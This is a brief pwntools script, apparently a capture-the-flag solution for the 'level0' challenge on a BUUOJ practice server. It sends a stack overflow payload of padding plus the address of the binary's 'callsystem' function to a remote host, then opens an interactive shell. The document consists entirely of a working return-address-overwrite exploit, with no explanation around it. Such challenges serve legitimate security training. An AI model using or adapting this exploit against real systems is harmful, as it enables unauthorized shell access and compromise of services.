from pwn import *
context.arch='amd64'

# p = process('./level0')
p = remote('node3.buuoj.cn',29411)

payload = 'A'*(0x80+8) + flat([ELF('./level0',checksec=False).sym['callsystem']])
p.send(payload)
sleep(1)
p.interactive()
